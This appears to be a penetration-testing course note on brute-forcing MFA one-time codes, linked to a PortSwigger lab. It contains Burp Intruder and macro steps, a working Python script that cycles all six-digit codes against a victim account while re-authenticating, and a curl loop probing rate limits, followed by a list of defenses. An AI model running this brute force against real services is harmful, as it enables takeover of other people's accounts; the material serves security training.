---
tags: [vapt, authentication, intermediate]
difficulty: intermediate
module: "16 - Authentication"
topic: "16.13 MFA Bypass — Brute Force OTP"
portswigger_labs: ["2FA bypass using a brute-force attack"]
---

# 16.13 — MFA Bypass: Brute Force OTP

## Why 6-Digit OTPs Can Be Brute Forced

```
6-DIGIT NUMERIC OTP:
  Range: 000000 to 999999 = 1,000,000 possible codes
  
  WITHOUT RATE LIMITING:
  At 10 requests/second → crack in 1,000,000 / 10 = 100,000 seconds = ~28 hours
  At 100 requests/second → ~3 hours
  At Burp Intruder speed → could be minutes on a fast connection!
  
  4-DIGIT SMS OTP:
  Range: 0000 to 9999 = 10,000 codes
  At 10/sec → 1000 seconds = ~17 minutes
  
  EVEN WITH RATE LIMITING:
  If limit = 10 attempts → 1% chance of guessing correctly in 10 tries!
  For high-value targets worth attempting
  If lockout resets → see note 16.10 for bypass
```

---

## Burp Intruder Brute Force

```
STEP 1: Intercept OTP submission
  POST /mfa/verify HTTP/1.1
  Session: <your session cookie after first factor>
  
  otp=§000000§&csrf_token=abc123

STEP 2: Intruder → Sniper → mark otp value as payload position

STEP 3: Payload type → Numbers
  Range: 0 to 999999
  Step: 1
  Min digits: 6 (pad with zeros: 000001, 000002...)

STEP 4: Options → Grep Match → add the success string
  ("Dashboard", "Welcome", "Account")
  → Highlights the winning attempt

STEP 5: Start attack → watch for anomalous response

IMPORTANT:
  CSRF token may need refreshing each request!
  If CSRF is in form, you need Burp Macro to:
  1. GET /mfa/verify → extract CSRF token
  2. POST /mfa/verify with token + OTP attempt
  
  Set up in: Burp → Project Options → Sessions → Macro
```

---

## Session Handling Issue

```
PROBLEM:
  Many apps re-route to /login if the "pre-MFA" session expires!
  
  During brute force:
  Attempt 1: valid session, wrong OTP
  Attempt 2: valid session, wrong OTP
  ...
  Attempt N: SESSION EXPIRED → redirected to /login
  → Can't continue brute force!
  
THE FIX FOR ATTACKER:
  Need to maintain a fresh session throughout attack
  
BURP SOLUTION:
  Use Burp Macro to:
  Step 1: POST /login (username+password) → creates new session
  Step 2: GET /mfa → extract CSRF token
  Step 3: POST /mfa with OTP attempt
  
  This way, every OTP attempt has a fresh session!
  (Even if server invalidates session after failed OTP, we re-authenticate)
```

---

## Python Brute Force Script

```python
import requests
import time

TARGET = "https://target.com"
SESSION_LOGIN = requests.Session()

def get_fresh_session():
    # Re-authenticate to get pre-MFA session
    resp = SESSION_LOGIN.post(f"{TARGET}/login", data={
        "username": "victim@example.com",
        "password": "correctpassword"  # obtained via brute force earlier
    })
    return SESSION_LOGIN

def try_otp(otp_code):
    session = get_fresh_session()
    # Get CSRF token from MFA page
    mfa_page = session.get(f"{TARGET}/mfa")
    # Extract csrf_token (BeautifulSoup or regex)
    # csrf = extract_csrf(mfa_page.text)
    
    resp = session.post(f"{TARGET}/mfa/verify", data={
        "otp": str(otp_code).zfill(6),
        # "csrf_token": csrf
    })
    return resp.status_code == 302 or "Dashboard" in resp.text

for code in range(1000000):
    if try_otp(code):
        print(f"[!] SUCCESS: OTP = {str(code).zfill(6)}")
        break
    if code % 100 == 0:
        print(f"[*] Tried {code}...")
    time.sleep(0.1)  # rate limiting awareness
```

---

## Testing Rate Limit and Lockout

```bash
# STEP 1: Check if rate limit exists on OTP:
for i in {1..10}; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST https://target.com/mfa/verify \
      -b "session=YOUR_SESSION" \
      -d "otp=00000${i}&csrf_token=YOUR_CSRF")
    echo "Attempt $i: HTTP $code"
    sleep 0.5
done
# → If all return same error, no lockout!
# → If 429 or 302 back to login after N → rate limit exists

# STEP 2: Check if lockout resets on session refresh:
# (See note 16.10 for detailed lockout bypass techniques)
```

---

## Fix

```
DEFENSES:
  ✓ Rate limit OTP attempts (5-10 per session max)
  
  ✓ Lock account's MFA after failures (require re-authentication + wait)
  
  ✓ Invalidate partial session after OTP failures:
    After 5 wrong OTPs → destroy the entire session
    Force full re-login + new OTP
    
  ✓ Use longer OTPs:
    6 digits = 10^6 = 1 million
    8 digits = 10^8 = 100 million (100x harder)
    
  ✓ Exponential backoff:
    1st failure: no delay
    2nd: 1 second
    3rd: 2 seconds
    4th: 4 seconds...
    → Makes brute force impractical
    
  ✓ Alert and notify user:
    Email/SMS when MFA fails repeatedly
    User can lock account themselves
```

---

## Related Notes
- [[11 - MFA Bypass Response Manipulation]] — response-based bypass
- [[12 - MFA Bypass Code Reuse]] — reusing valid OTPs
- [[10 - Account Lockout Bypass]] — bypassing lockout on MFA
